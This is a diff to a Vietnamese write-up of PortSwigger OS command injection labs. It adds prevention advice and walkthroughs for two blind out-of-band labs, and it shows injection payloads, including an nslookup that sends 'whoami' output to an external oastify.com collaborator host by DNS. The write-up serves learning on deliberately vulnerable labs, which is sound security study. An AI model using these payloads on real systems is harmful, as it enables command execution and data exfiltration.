@@ -92,6 +92,17 @@ Hàm subprocess.call()/subprocess.run()</pre></li>
 <li><pre> Ngôn ngữ Java
 Cần chú ý java.lang.Runtime.getRuntime().exec(command)</pre></li>
 
+### prevent
+
+#### Giai đoạn đang phát triển
+
+- Nếu thực hiện OS command có lỗi thì không dùng command nữa là xong :v (nghĩa là không bao giờ gọi OS command từ lớp ứng dụng).
+- Trong các trường hợp, có nhiều cách khác nhau để thực hiện chức năng cần thiết bằng cách sử dụng API trên nền tảng an toàn hơn. Nếu không thể tránh khỏi việc sử dụng các lệnh OS thì phải thực hiện xác thực đầu vào mạnh.
+
+#### Giai đoạn release
+
+- Nếu đã fix được hầu hết các bug OS Command Injection ở giai đoạn phát triển thì chúng ta sẽ cần 1 lớp phòng thủ nữa ở giai đoạn Release, đó là WAF (Web Application Firewall)
+
 ## 1. Lab: OS command injection, simple case
 
 link: https://portswigger.net/web-security/os-command-injection/lab-simple
@@ -143,7 +154,7 @@ và sẽ trả về số sản phẩm qua lệnh kiem_tra tồn kho cùng user q
 
 mình đã viết lại script khai thác
 
-```python
+```python=
 #!/usr/bin/python3.7
 import requests
 import re
@@ -211,7 +222,7 @@ và sau 10 giây mình thấy gói tin mới phản hồi
 
 mình đã viết lại script khai thác
 
-```python
+```python=
 #!/usr/bin/python3.7
 import requests
 import re
@@ -302,7 +313,7 @@ email=abc%40gmail.com;whoami>/var/www/images/whoami${IFS}||${IFS}
 
 mình đã viết lại script khai thác
 
-```python
+```python=
 #!/usr/bin/python3.7
 import requests
 import re
@@ -364,3 +375,57 @@ print(soup)
 mục đích của chúng ta đã được thực hiện và mình cũng đã giải quyết được bài lab này
 
 ![image](https://hackmd.io/_uploads/HkT7Qh9Kp.png)
+
+## 4.Lab: Blind OS command injection with out-of-band interaction
+
+link: https://portswigger.net/web-security/os-command-injection/lab-blind-out-of-band
+
+### Đề bài
+
+![image](https://hackmd.io/_uploads/rJVkFjE_R.png)
+
+### Phân tích
+
+- Ứng dụng thực thi lệnh shell chứa thông tin chi tiết do người dùng cung cấp. Lệnh được thực thi không đồng bộ và không ảnh hưởng đến phản hồi của ứng dụng. Không thể chuyển hướng đầu ra vào vị trí mà bạn có thể truy cập. Tuy nhiên, bạn có thể kích hoạt tương tác ngoài băng tần với miền bên ngoài.
+
+### Khai thác
+
+![image](https://hackmd.io/_uploads/SJ4R1hNuR.png)
+
+- thực hiện nslookup truy vấn đến burpcolabrator của chúng ta
+
+`;nslookup+wbbx198pcmvu9iw4z7r37e7n2e85wvkk.oastify.com;`
+
+![image](https://hackmd.io/_uploads/rJK5ln4uA.png)
+
+![image](https://hackmd.io/_uploads/Byzox3NuC.png)
+
+![image](https://hackmd.io/_uploads/Bk-3gnEdC.png)
+
+## 5. Lab: Blind OS command injection with out-of-band data exfiltration
+
+link: https://portswigger.net/web-security/os-command-injection/lab-blind-out-of-band-data-exfiltration
+
+### Đề bài
+
+![image](https://hackmd.io/_uploads/Hkw8-3VOA.png)
+
+### Phân tích
+
+- Ứng dụng thực thi lệnh shell chứa thông tin chi tiết do người dùng cung cấp. Lệnh được thực thi không đồng bộ và không ảnh hưởng đến phản hồi của ứng dụng. Không thể chuyển hướng đầu ra vào vị trí mà bạn có thể truy cập. Tuy nhiên, bạn có thể kích hoạt tương tác ngoài băng tần với miền bên ngoài.
+
+Để giải bài lab, hãy thực hiện whoamilệnh và trích xuất đầu ra thông qua truy vấn DNS tới Burp Collaborator. Bạn sẽ cần nhập tên người dùng hiện tại để hoàn thành bài lab.
+
+### Khai thác
+
+- thực hiện nslookup truy vấn đến burpcolabrator của chúng ta với kết quả của lệnh được thực thi whoami
+
+`` ;nslookup+`whoami`.cgwd6pd5h20aey1k4nwjcuc37udl1cp1.oastify.com; ``
+
+![image](https://hackmd.io/_uploads/rJz0f2Ed0.png)
+
+![image](https://hackmd.io/_uploads/B1ZTG3E_A.png)
+
+![image](https://hackmd.io/_uploads/S14hf2VdA.png)
+
+<img  src="https://3198551054-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FVvHHLY2mrxd5y4e2vVYL%2Fuploads%2FF8DJirSFlv1Un7WBmtvu%2Fcomplete.gif?alt=media&token=045fd197-4004-49f4-a8ed-ee28e197008f">
